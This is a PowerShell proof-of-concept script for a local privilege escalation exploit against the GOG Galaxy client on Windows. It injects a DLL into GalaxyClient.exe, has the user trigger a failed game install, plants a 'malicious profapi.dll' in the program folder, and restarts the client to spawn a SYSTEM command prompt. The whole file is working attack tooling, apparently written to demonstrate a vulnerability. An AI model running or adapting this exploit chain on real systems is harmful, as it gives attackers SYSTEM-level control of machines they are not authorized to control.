function Write-Log([string]$label, [string]$message) {
    $foregroundColor = $null
    switch ($label) {
        "INFO" { $foregroundColor = "Yellow" }
        "DEBUG" { $foregroundColor = "Gray" }
        "ERROR" { $foregroundColor = "Red" }
        "SUCCESS" { $foregroundColor = "Green" }
    }
    if ($foregroundColor -ne $null) {
        Write-Host ("[$label] $message") -ForegroundColor $foregroundColor
    } else {
        Write-Host ("[$label] $message")
    }
}

function Stop-GalaxyClient {
    $GOGGalaxy = Get-Process GalaxyClient -ErrorAction SilentlyContinue

    if ($GOGGalaxy){
        $GOGGalaxy | Stop-Process -Force
        Write-Log "INFO" "GalaxyClient.exe succesfully stopped."
    } else {
        Write-Log "INFO" "GalaxyClient.exe is not running, so it does not need to be stopped."
    }
}

function Start-GalaxyClient {
        $GOGGalaxy = Get-Process GalaxyClient -ErrorAction SilentlyContinue

        if (-Not $GOGGalaxy){
            Write-Log "INFO" "Deleting the 'C:\ProgramData\GOG.com\Galaxy\webcache' directory."
            Remove-Item -LiteralPath "C:\ProgramData\GOG.com\Galaxy\webcache" -Force -Recurse

            Start-Process -FilePath "C:\Program Files (x86)\GOG Galaxy\GalaxyClient.exe"
            Write-Log "INFO" "GalaxyClient.exe succesfully started."
            Start-Sleep 15

        } else {

            Write-Log "INFO" "GalaxyClient.exe is running, stopping it right now."
            Stop-GalaxyClient
            Sleep 5

            Start-Process -FilePath "C:\Program Files (x86)\GOG Galaxy\GalaxyClient.exe"
            Write-Log "INFO" "GalaxyClient.exe succesfully started."
            Start-Sleep 15
        }
}

function Check-WritePermissionsForEveryone([string]$path) {
    $acl = Get-Acl $path
    foreach ($access in $acl.Access) {
        if ($access.IdentityReference -eq "Everyone" -and $access.FileSystemRights -band [System.Security.AccessControl.FileSystemRights]::Write) {
            return $true
        }
    }
    return $false
}

function Get-ScriptRootDirectory {
    $ScriptRootDir = (Get-Location).Path
    Write-Log "DEBUG" "$ScriptRootDir"

    return $ScriptRootDir
}

function Inject-GalaxyDLL([string]$DLLName, [string]$ServiceName) {
    $ScriptRootDir = Get-ScriptRootDirectory
    $DLLPath = $ScriptRootDir + "\" +  $DLLName
    
    $InjectorExecutable = $ScriptRootDir + "\" +  "DLL Injector.exe"
    & $InjectorExecutable $DLLPath $ServiceName #> $null
}

function Plant-ProfapiDLL([string]$DLLName, [string]$Path) {
    $ScriptRootDir = Get-ScriptRootDirectory
    $DLLPath = $ScriptRootDir + "\" +  $DLLName

    Copy-Item -Path $DLLPath -Destination $Path
}


#Main starts here
Start-GalaxyClient

$hasWritePermissions = Check-WritePermissionsForEveryone "C:\Program Files (x86)\GOG Galaxy"

if ($hasWritePermissions) {
    Write-Log "ERROR" "The 'Everyone' group has write permissions for the 'C:\Program Files (x86)\GOG Galaxy' directory. This means that the exploit was already ran, please re-install GOG Galaxy and retry." -ForegroundColor Red
    exit
} else {
    Write-Log "SUCCESS" "The 'Everyone' group does not have write permissions for the C:\Program Files (x86)\GOG Galaxy directory."
    Write-Log "INFO" "Starting the Local Privilege Escalation attack to spawn a new CMD as NT/AUTHORITY SYSTEM."
    
    Write-Log "INFO" "Injecting the galaxy_dll.dll into the GalaxyClient.exe proccess."
    Inject-GalaxyDLL "galaxy_dll.dll" "GalaxyClient.exe"
    Write-Log "SUCCESS" "Injection successful."

    Write-Log "INFO" "Go ahead and install a game under the 'C:\Program Files (x86)\GOG Galaxy' directory before proceeding. Please press ENTER after the game installation process fails."
    Read-Host "Press ENTER to continue ..."

    Write-Log "INFO" "Plating the malicious profapi.dll into the 'C:\Program Files (x86)\GOG Galaxy' directory"
    Plant-ProfapiDLL "profapi.dll" "C:\Program Files (x86)\GOG Galaxy"

    Write-Log "INFO" "Restarting 'GalaxyClient.exe' to complete the attack"
    Start-GalaxyClient
}
